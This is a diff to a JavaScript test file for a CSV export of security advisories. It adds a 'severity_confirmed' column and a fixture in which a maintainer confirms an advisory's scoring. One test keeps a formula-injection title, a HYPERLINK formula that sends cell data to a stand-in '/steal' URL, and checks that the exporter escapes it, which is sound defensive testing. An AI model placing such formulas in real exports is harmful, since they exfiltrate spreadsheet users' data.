@@ -119,7 +119,7 @@ function records(text) {
   return lines;
 }
 
-test('the export carries one record per corpus member, under the columns', () => {
+test('the export carries one record per corpus member, under the columns', async () => {
   const read = advisory({
     state: 'Published',
     severity: 'high',
@@ -161,7 +161,38 @@ test('the export carries one record per corpus member, under the columns', () =>
       },
     ],
   });
-  const text = csv.toCsv(
+  // A maintainer confirmed this draft's current scoring: moderate, no vector.
+  const confirmed = advisory({
+    state: 'Draft',
+    severity: 'moderate',
+    title: 'Scored and confirmed',
+    reportedAt: '2026-06-01T00:00:00Z',
+    severityField: 'moderate',
+    severityFieldPresent: true,
+    cvssV3: '',
+    cvssV3Present: true,
+    comments: [
+      comment({
+        author: 'samuelkarp',
+        role: 'Member',
+        at: '2026-06-02T00:00:00Z',
+        state: {
+          betterGhsa: '1.0',
+          seq: 1,
+          by: 'samuelkarp',
+          at: '2026-06-02T00:00:00Z',
+          confirmed: {
+            scoring: {
+              by: 'samuelkarp',
+              at: '2026-06-02T00:00:00Z',
+              fp: await schema.scoringFingerprint('moderate', ''),
+            },
+          },
+        },
+      }),
+    ],
+  });
+  const text = await csv.toCsv(
     corpusOf([
       member({ ghsaId: 'GHSA-aaaa-aaaa-aaaa', state: 'published', advisory: read }),
       member({
@@ -171,27 +202,36 @@ test('the export carries one record per corpus member, under the columns', () =>
         severity: 'low',
         openedAt: '2026-04-05T00:00:00Z',
       }),
+      member({ ghsaId: 'GHSA-dddd-dddd-dddd', state: 'draft', advisory: confirmed }),
     ])
   );
 
   const lines = records(text);
-  assert.strictEqual(lines.length, 3, `records: ${lines.length}`);
+  assert.strictEqual(lines.length, 4, `records: ${lines.length}`);
   assert.strictEqual(
     lines[0],
-    'ghsa_id,title,state,severity,closure_reason,reported_at,month,' +
+    'ghsa_id,title,state,severity,severity_confirmed,closure_reason,reported_at,month,' +
       'time_to_first_response_ms,time_to_accept_ms,time_to_close_ms,time_to_publish_ms,' +
-      'detail_fetched,observed_at'
+      'page_loaded,observed_at'
   );
   assert.strictEqual(
     lines[1],
-    'GHSA-aaaa-aaaa-aaaa,Path traversal in the drawer handler,published,high,fixed,' +
+    'GHSA-aaaa-aaaa-aaaa,Path traversal in the drawer handler,published,high,no,fixed,' +
       '2026-05-04T14:00:00Z,2026-05,1800000,3600000,86400000,172800000,yes,' +
-      '2026-08-27T09:00:00.000Z'
+      '2026-08-27T09:00:00.000Z',
+    'a loaded page whose scoring nobody confirmed'
   );
   assert.strictEqual(
     lines[2],
-    'GHSA-bbbb-bbbb-bbbb,Only the list page has looked at this one,closed,low,,' +
-      '2026-04-05T00:00:00Z,2026-04,,,,,no,'
+    'GHSA-bbbb-bbbb-bbbb,Only the list page has looked at this one,closed,low,,,' +
+      '2026-04-05T00:00:00Z,2026-04,,,,,no,',
+    'a page not loaded says nothing about its scoring'
+  );
+  assert.strictEqual(
+    lines[3],
+    'GHSA-dddd-dddd-dddd,Scored and confirmed,draft,moderate,yes,,' +
+      '2026-06-01T00:00:00Z,2026-06,,,,,yes,2026-08-27T09:00:00.000Z',
+    'a draft whose current scoring a maintainer confirmed'
   );
 });
 
@@ -204,7 +244,7 @@ test('a field carrying a separator, a quote, or a line break is quoted', () => {
   assert.strictEqual(csv.field(0), '0');
 });
 
-test('a title a reporter wrote as a formula is exported as text', () => {
+test('a title a reporter wrote as a formula is exported as text', async () => {
   // The reporter controls the title. Spreadsheet formulas must be escaped.
   const title = '=HYPERLINK("https://example.invalid/steal?c="&A1,"click")';
   assert.strictEqual(csv.field(title), `"'${title.replace(/"/g, '""')}"`);
@@ -212,7 +252,7 @@ test('a title a reporter wrote as a formula is exported as text', () => {
     assert.strictEqual(csv.field(`${lead}x`), `"'${lead}x"`, `a field opening with ${lead}`);
   }
 
-  const text = csv.toCsv(
+  const text = await csv.toCsv(
     corpusOf([member({ ghsaId: 'GHSA-cccc-cccc-cccc', state: 'closed', title })])
   );
   const line = /** @type {string} */ (records(text)[1]);
